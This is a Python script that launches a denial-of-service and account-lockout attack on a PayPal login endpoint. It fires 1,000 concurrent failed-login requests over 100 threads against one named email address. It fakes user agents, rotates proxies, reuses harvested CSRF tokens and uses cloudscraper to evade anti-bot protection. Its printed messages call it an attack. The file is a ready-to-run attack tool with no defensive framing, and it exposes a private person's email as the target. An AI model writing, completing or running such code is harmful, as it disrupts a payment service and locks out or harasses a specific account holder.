import requests
import cloudscraper
from concurrent.futures import ThreadPoolExecutor
from faker import Faker
import time
import random
import logging

# Set up logging to track requests and responses
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', filename='paypal_endpoint_hits.log')

# Target endpoint as provided
TARGET_URL = "https://api.paypal.com/v1/oauth2/login"

# Number of threads/requests to send concurrently (increased for more aggressive DoS simulation)
THREAD_COUNT = 100

# Total number of requests to send
TOTAL_REQUESTS = 1000

# Fake user agent generator
fake = Faker()

# List of proxies (optional, add your own if you want IP rotation)
PROXIES = [
    # Example format: {"http": "http://proxy1:port", "https": "http://proxy1:port"},
    # {"http": "http://proxy2:port", "https": "http://proxy2:port"},
]

# Input fields for PayPal email and password (replace these with target values)
PAYPAL_EMAIL = "ogorchukwuf@gmail.com"  # Replace with target PayPal email
PAYPAL_PASSWORD = "wrongpassword123"      # Replace with wrong password for failed logins

# Hardcoded headers to mimic PayPal frontend browser request
def get_headers():
    return {
        "User-Agent": fake.user_agent(),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/json; charset=UTF-8",
        "Referer": "https://www.paypal.com/signin",
        "Origin": "https://www.paypal.com",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Requested-With": "XMLHttpRequest",  # Often used for AJAX requests from frontend
        "Connection": "keep-alive",
    }

# Hardcoded payload for login attempt (adjust based on actual frontend request if needed)
def get_payload():
    return {
        "email": PAYPAL_EMAIL,
        "password": PAYPAL_PASSWORD,
        "grant_type": "password",  # Common for OAuth2 login flows
    }

# Function to extract CSRF token if present in response headers or cookies
def extract_csrf_token(session):
    try:
        # Make an initial GET request to the signin page or endpoint to fetch cookies or headers with CSRF token
        init_response = session.get("https://www.paypal.com/signin", headers=get_headers(), timeout=5)
        # Check cookies for potential CSRF token (adjust key based on actual token name)
        csrf_token = session.cookies.get("csrf_token", None) or session.cookies.get("X-CSRF-TOKEN", None)
        if not csrf_token:
            # Check response headers as some systems include it there
            csrf_token = init_response.headers.get("X-CSRF-Token", None)
        logging.info(f"Extracted CSRF Token: {csrf_token if csrf_token else 'Not found'}")
        return csrf_token
    except Exception as e:
        logging.error(f"Failed to extract CSRF token: {str(e)}")
        return None

# Function to send a single request using a session
def send_request(request_id, session, scraper, csrf_token=None):
    try:
        # Select a random proxy if available
        proxy = random.choice(PROXIES) if PROXIES else None
        
        # Prepare headers and payload
        headers = get_headers()
        payload = get_payload()
        
        # Add CSRF token to headers if available
        if csrf_token:
            headers["X-CSRF-Token"] = csrf_token
        
        # Use cloudscraper to bypass anti-bot measures if normal request fails
        try:
            response = session.post(TARGET_URL, headers=headers, json=payload, proxies=proxy, timeout=5)
        except requests.exceptions.RequestException:
            response = scraper.post(TARGET_URL, headers=headers, json=payload, proxies=proxy, timeout=5)
        
        # Log the response
        logging.info(f"Request {request_id} - Status Code: {response.status_code} - Response: {response.text[:100]}...")
        print(f"Request {request_id} - Status: {response.status_code}")
        
        return response.status_code
    
    except requests.exceptions.RequestException as e:
        logging.error(f"Request {request_id} failed: {str(e)}")
        print(f"Request {request_id} failed: {str(e)}")
        return None

# Main function to handle concurrent requests
def hit_endpoint():
    request_counter = 0
    successful_requests = 0
    rate_limit_hits = 0
    
    # Create a persistent session to mimic browser cookie handling
    session = requests.Session()
    
    # Create a cloudscraper instance for bypassing anti-bot measures
    scraper = cloudscraper.create_scraper(sess=session)
    
    # Attempt to extract CSRF token if required
    csrf_token = extract_csrf_token(session)
    
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = []
        for i in range(TOTAL_REQUESTS):
            request_counter += 1
            futures.append(executor.submit(send_request, request_counter, session, scraper, csrf_token))
            # Reduced delay for more aggressive DoS simulation
            time.sleep(random.uniform(0.01, 0.05))
        
        # Collect results
        for future in futures:
            status_code = future.result()
            if status_code:
                successful_requests += 1
                if status_code == 429:  # Rate limit status code
                    rate_limit_hits += 1
    
    logging.info(f"Total Requests: {request_counter}, Successful: {successful_requests}, Rate Limited: {rate_limit_hits}")
    print(f"Summary - Total: {request_counter}, Success: {successful_requests}, Rate Limited: {rate_limit_hits}")

if __name__ == "__main__":
    print(f"Starting attack on {TARGET_URL} with {TOTAL_REQUESTS} requests using {THREAD_COUNT} threads...")
    print(f"Targeting PayPal account: {PAYPAL_EMAIL}")
    hit_endpoint()
    print("Attack completed. Check 'paypal_endpoint_hits.log' for details.")
